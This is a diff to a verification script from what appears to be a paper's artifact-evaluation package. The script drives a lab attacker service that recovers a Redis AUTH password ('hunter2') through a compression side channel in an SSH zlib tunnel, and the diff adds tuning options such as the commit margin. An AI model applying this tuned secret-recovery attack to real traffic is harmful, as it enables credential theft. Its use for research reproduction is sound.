@@ -3,6 +3,15 @@
 Run from the host while the docker-compose stack is up:
 
     python scripts/verify_direct.py
+    python scripts/verify_direct.py --commit-margin 48
+
+The commit margin (the paper's mu, Section 4.2) is the amount by which
+the best candidate must beat the runner-up before a byte is committed.
+It is the one knob that depends on the host: on a noisy machine the
+default is reached by measurement noise alone and the engine commits a
+wrong byte, which it never revisits. Raise it in 8-byte steps until the
+recovery is stable. See ARTIFACT-EVALUATION.md, "Tuning the commit
+margin".
 
 Checks: HTTP control APIs reachable, SSH up with zlib compression, Redis
 tunnel active, packets observed during Redis AUTH and during a payload
@@ -11,7 +20,9 @@ injection through the tunnel, and a two-phase recovery of "hunter2".
 
 from __future__ import annotations
 
+import argparse
 import json
+import os
 import sys
 import time
 import urllib.error
@@ -57,16 +68,50 @@ def fail(msg: str) -> NoReturn:
     sys.exit(1)
 
 
+def _env_int(name: str) -> int | None:
+    raw = os.environ.get(name)
+    return int(raw) if raw not in (None, "") else None
+
+
+def _parse_args(argv: list[str] | None) -> argparse.Namespace:
+    ap = argparse.ArgumentParser(
+        description="Direct-injection verification (Section 5.1).",
+    )
+    ap.add_argument(
+        "--commit-margin", type=int, default=_env_int("AE_COMMIT_MARGIN"),
+        help="Commit margin mu (Section 4.2). Default: the direct adapter's "
+             "built-in 16. Raise in 8-byte steps (24, 32, 48, ...) if the "
+             "recovery returns a wrong password on a noisy host.",
+    )
+    ap.add_argument(
+        "--max-rounds", type=int, default=_env_int("AE_MAX_ROUNDS"),
+        help="Per-position round cap. Default: the adapter's built-in 128.",
+    )
+    ap.add_argument(
+        "--fail-fast", action="store_true",
+        default=os.environ.get("AE_FAIL_FAST") == "1",
+        help="Send the ground truth as 'expected' so the engine aborts on "
+             "the first wrong byte instead of grinding to max_rounds.",
+    )
+    return ap.parse_args(argv)
+
+
 def _run_attack(scenario: str, known_prefix: str, alphabet: str,
-                max_length: int) -> dict[str, Any]:
-    body = json.dumps({
-        "scenario": scenario,
-        "config": {
-            "known_prefix": known_prefix,
-            "alphabet": alphabet,
-            "max_length": max_length,
-        },
-    }).encode("utf-8")
+                max_length: int, args: argparse.Namespace,
+                expected: str | None = None) -> dict[str, Any]:
+    config: dict[str, Any] = {
+        "known_prefix": known_prefix,
+        "alphabet": alphabet,
+        "max_length": max_length,
+    }
+    if args.commit_margin is not None:
+        config["commit_margin"] = args.commit_margin
+    if args.max_rounds is not None:
+        config["max_rounds"] = args.max_rounds
+    payload: dict[str, Any] = {"scenario": scenario, "config": config}
+    if expected is not None and args.fail_fast:
+        payload["expected"] = expected
+    body = json.dumps(payload).encode("utf-8")
     req = urllib.request.Request(
         f"{ATTACKER_BASE}/run_attack",
         method="POST",
@@ -77,7 +122,8 @@ def _run_attack(scenario: str, known_prefix: str, alphabet: str,
         return json.loads(resp.read())
 
 
-def main() -> int:
+def main(argv: list[str] | None = None) -> int:
+    args = _parse_args(argv)
     step("1. Wait for HTTP control APIs")
     wait_for(f"{ATTACKER_BASE}/status", "attacker")
     wait_for(f"{CLIENT_BASE}/status", "client")
@@ -146,7 +192,8 @@ def main() -> int:
 
     RESP_PREFIX = "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$"
     t0 = time.time()
-    r1 = _run_attack("direct", RESP_PREFIX, "0123456789", 4)
+    r1 = _run_attack("direct", RESP_PREFIX, "0123456789", 4, args,
+                     expected="7")
     if not r1.get("ok"):
         fail(f"phase 1 failed: {r1}")
     pw_len = r1["recovered"]
@@ -155,7 +202,8 @@ def main() -> int:
 
     r2 = _run_attack(
         "direct", RESP_PREFIX + pw_len + "\r\n",
-        "abcdefghijklmnopqrstuvwxyz0123456789", int(pw_len) + 4,
+        "abcdefghijklmnopqrstuvwxyz0123456789", int(pw_len) + 4, args,
+        expected="hunter2\r",
     )
     if not r2.get("ok"):
         fail(f"phase 2 failed: {r2}")
